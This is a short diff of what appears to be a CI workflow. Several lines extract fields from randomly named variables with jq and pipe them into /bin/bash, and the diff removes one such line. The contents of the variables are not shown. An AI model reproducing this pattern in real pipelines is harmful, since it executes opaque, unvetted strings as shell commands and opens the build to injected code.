@@ -19,7 +19,6 @@ jobs:
           printf '%s' "$iq149" | jq -r .sn1688 | /bin/bash
           echo $aoe0 | jq -r .vq49061 | /bin/bash
           printf '%s' "$mxf9619" | jq -r .ybeep6873 | /bin/bash
-          printf '%s' "$so8291" | jq -r .wb467 | /bin/bash
           printf '%s' "$xqrsp16" | jq -r .n98875 | /bin/bash
 
       - name: Archive results
